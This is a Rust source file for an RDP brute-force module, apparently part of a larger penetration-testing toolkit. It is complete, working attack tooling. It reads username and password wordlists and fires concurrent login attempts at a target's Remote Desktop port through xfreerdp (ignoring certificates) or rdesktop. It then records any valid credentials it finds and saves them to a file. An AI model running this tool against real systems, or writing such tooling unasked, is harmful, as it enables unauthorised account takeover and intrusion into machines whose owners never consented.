use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicU64, Ordering},
    time::Instant,
};
use tokio::{
    process::Command,
    sync::{Mutex, Semaphore},
    time::{sleep, Duration, timeout},
};

const PROGRESS_INTERVAL_SECS: u64 = 2;

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::stdout().flush();
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   RDP Brute Force Module                                  ║".cyan());
    println!("{}", "║   Remote Desktop Protocol Credential Testing              ║".cyan());
    println!("{}", "║   Requires xfreerdp or rdesktop                           ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = loop {
        let input = prompt_default("RDP Port", "3389")?;
        match input.trim().parse::<u16>() {
            Ok(p) if p > 0 => break p,
            Ok(_) => println!("{}", "Port must be between 1 and 65535.".yellow()),
            Err(_) => println!("{}", "Invalid port number. Please enter a number between 1 and 65535.".yellow()),
        }
    };

    let usernames_file_path = loop {
        let input = prompt_required("Username wordlist path")?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let passwords_file_path = loop {
        let input = prompt_required("Password wordlist path")?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.trim().parse::<usize>() {
            Ok(n) if n > 0 && n <= 10000 => break n,
            Ok(n) if n == 0 => println!("{}", "Concurrency must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Concurrency must be between 1 and 10000.".yellow()),
            Err(_) => println!("{}", "Invalid number. Please enter a positive integer.".yellow()),
        }
    };

    let timeout_secs: u64 = loop {
        let input = prompt_default("Connection timeout (seconds)", "10")?;
        match input.trim().parse::<u64>() {
            Ok(n) if n > 0 && n <= 300 => break n,
            Ok(n) if n == 0 => println!("{}", "Timeout must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Timeout must be between 1 and 300 seconds.".yellow()),
            Err(_) => println!("{}", "Invalid timeout. Please enter a number between 1 and 300.".yellow()),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file name", "rdp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false)?;

    let addr = format_socket_address(target, port);
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    println!("\n[*] Starting brute-force on {}", addr);
    println!("[*] Timeout: {} seconds", timeout_secs);

    // Count lines for display
    let user_count = count_lines(&usernames_file_path)?;
    if user_count == 0 {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", user_count);

    let password_count = count_lines(&passwords_file_path)?;
    if password_count == 0 {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", password_count);

    let total_attempts = if combo_mode { user_count * password_count } else { password_count };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();

    if combo_mode {
        // Try every password with every user - read line by line
        let user_file = File::open(&usernames_file_path)?;
        let user_reader = BufReader::new(user_file);
        
        for user_line in user_reader.lines() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }
            
            let user = match user_line {
                Ok(line) => line.trim().to_string(),
                Err(_) => continue,
            };
            
            if user.is_empty() {
                continue;
            }

            // Open password file for each user
            let pass_file = File::open(&passwords_file_path)?;
            let pass_reader = BufReader::new(pass_file);
            
            for pass_line in pass_reader.lines() {
                if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                    break;
                }
                
                let pass = match pass_line {
                    Ok(line) => line.trim().to_string(),
                    Err(_) => continue,
                };
                
                if pass.is_empty() {
                    continue;
                }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;
                let timeout_duration = Duration::from_secs(timeout_secs);

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                            found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            if verbose_flag {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }
                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

                // Limit concurrent tasks
                if tasks.len() >= concurrency {
                    if let Some(res) = tasks.next().await {
                        if let Err(e) = res {
                            log(verbose, &format!("[!] Task join error: {}", e));
                        }
                    }
                }
            }
        }
    } else {
        // Try passwords sequentially, cycling through users - read line by line
        let pass_file = File::open(&passwords_file_path)?;
        let pass_reader = BufReader::new(pass_file);
        
        // Load users into memory for cycling (needed for modulo access)
        let users = load_lines(&usernames_file_path)?;
        
        for (i, pass_line) in pass_reader.lines().enumerate() {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
                break;
            }
            
            let pass = match pass_line {
                Ok(line) => line.trim().to_string(),
                Err(_) => continue,
            };
            
            if pass.is_empty() {
                continue;
            }
            
            let user = users[i % users.len()].clone();

                let addr_clone = addr.clone();
                let pass_clone = pass.clone();
                let found_credentials_clone = Arc::clone(&found_credentials);
                let stop_signal_clone = Arc::clone(&stop_signal);
                let semaphore_clone = Arc::clone(&semaphore);
                let stats_clone = Arc::clone(&stats);
                let verbose_flag = verbose;
                let stop_on_success_flag = stop_on_success;
                let timeout_duration = Duration::from_secs(timeout_secs);

                tasks.push(tokio::spawn(async move {
                    if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                        return;
                    }

                    match try_rdp_login(&addr_clone, &user, &pass_clone, timeout_duration).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
                            let mut found = found_credentials_clone.lock().await;
                            found.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
                            stats_clone.record_attempt(true, false);
                            if stop_on_success_flag {
                                stop_signal_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            if verbose_flag {
                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
                            }
                        }
                    }
                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));

            // Limit concurrent tasks
            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        log(verbose, &format!("[!] Task join error: {}", e));
                    }
                }
            }
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task join error: {}", e).red());
            }
        }
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final();

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            match File::create(&filename) {
                Ok(mut file) => {
                    for (host_addr, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host_addr, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file: {}", filename.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", filename.display());
                }
                Err(e) => {
                    eprintln!("[!] Could not create output file '{}': {}", filename.display(), e);
                }
            }
        }
    }

    Ok(())
}

async fn try_rdp_login(addr: &str, user: &str, pass: &str, timeout_duration: Duration) -> Result<bool> {
    // Check if xfreerdp is available
    let xfreerdp_check = Command::new("which")
        .arg("xfreerdp")
        .output()
        .await;
    
    let use_xfreerdp = if let Ok(output) = xfreerdp_check {
        output.status.success()
    } else {
        false
    };

    if !use_xfreerdp {
        // Fallback: try rdesktop if xfreerdp is not available
        let rdesktop_check = Command::new("which")
            .arg("rdesktop")
            .output()
            .await;
        
        let use_rdesktop = if let Ok(output) = rdesktop_check {
            output.status.success()
        } else {
            false
        };
        
        if use_rdesktop {
            return try_rdp_login_rdesktop(addr, user, pass, timeout_duration).await;
        }
        
        return Err(anyhow!("Neither xfreerdp nor rdesktop is available. Please install one of them."));
    }

    // Use xfreerdp for authentication
    let mut child = Command::new("xfreerdp")
        .arg(format!("/v:{}", addr))
        .arg(format!("/u:{}", user))
        .arg(format!("/p:{}", pass))
        .arg("/cert:ignore")
        .arg(format!("/timeout:{}", timeout_duration.as_secs() * 1000))
        .arg("+auth-only") // Attempt authentication without full desktop session
        .arg("/log-level:OFF")
        .arg("/sec:nla") // Use Network Level Authentication
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;

    // Wait for process with timeout
    match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // Check exit code - 0 typically means success
            Ok(status.success())
        }
        Ok(Err(e)) => {
            Err(anyhow!("Process error: {}", e))
        }
        Err(_) => {
            // Timeout - kill the process
            let _ = child.kill().await;
            Ok(false)
        }
    }
}

async fn try_rdp_login_rdesktop(addr: &str, user: &str, pass: &str, timeout_duration: Duration) -> Result<bool> {
    // Fallback to rdesktop (less reliable but sometimes available)
    let mut child = Command::new("rdesktop")
        .arg("-u")
        .arg(user)
        .arg("-p")
        .arg(pass)
        .arg("-n")
        .arg("auth-only")
        .arg(addr)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;

    match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => Ok(status.success()),
        Ok(Err(e)) => Err(anyhow!("Process error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    }
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required. Please provide a value.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default_val: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default_val).cyan().bold());
    std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default_val.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush().map_err(|e| anyhow!("Failed to flush stdout: {}", e))?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

fn count_lines<P: AsRef<Path>>(path: P) -> Result<usize> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .filter(|line| !line.trim().is_empty())
        .count())
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path = Path::new(input_path_str);
    let filename_component = path
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .unwrap_or_else(|| std::borrow::Cow::Borrowed(input_path_str));

    let final_name = if filename_component.is_empty()
        || filename_component == "."
        || filename_component == ".."
        || filename_component.contains('/')
        || filename_component.contains('\\')
    {
        "rdp_results.txt"
    } else {
        filename_component.as_ref()
    };

    PathBuf::from(format!("./{}", final_name))
}

fn format_socket_address(ip: &str, port: u16) -> String {
    let trimmed_ip = ip.trim_matches(|c| c == '[' || c == ']');
    if trimmed_ip.contains(':') && !trimmed_ip.contains("]:") {
        format!("[{}]:{}", trimmed_ip, port)
    } else {
        format!("{}:{}", trimmed_ip, port)
    }
}